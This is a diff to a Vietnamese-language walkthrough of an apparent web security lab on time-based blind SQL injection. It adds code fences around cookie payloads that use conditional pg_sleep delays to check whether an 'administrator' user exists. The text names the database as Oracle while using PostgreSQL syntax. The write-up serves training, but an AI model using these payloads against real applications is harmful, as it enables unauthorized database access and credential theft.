@@ -4,15 +4,24 @@ Xác định được CSDL đang sử dụng là Oracle bằng cách sử dụng
 > **TrackingId=crL1RtnRvnEhp8aD'||pg_sleep(10)--**
 
 Chúng ta sẽ xác nhận user admin có trong bảng user không bằng cách thử câu điều kiện lỗi.
+
+```markdown
 **SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END**
+```
 
 Áp dụng vào trackingId
-> **TrackingId=crL1RtnRvnEhp8aD'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--**
+
+```markdown
+**TrackingId=crL1RtnRvnEhp8aD'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--**
+```
 
 điều kiện đúng thì thực hiện vế 1, không thì thực hiện else => Ta sẽ thấy mất hẳn 5s reponse mới được trả về => đây là đk đúng
 
 Ta truy vấn kiểm tra xem user admin có tồn tại hay không nhờ vào thời gian trả về reponse là từ 5s
-> **TrackingId=crL1RtnRvnEhp8aD'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM USERS)--**
+
+```markdown
+**TrackingId=crL1RtnRvnEhp8aD'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM USERS)--**
+```
 
 ![](/imgs/SQL-Injection/61.png?raw=true)
 
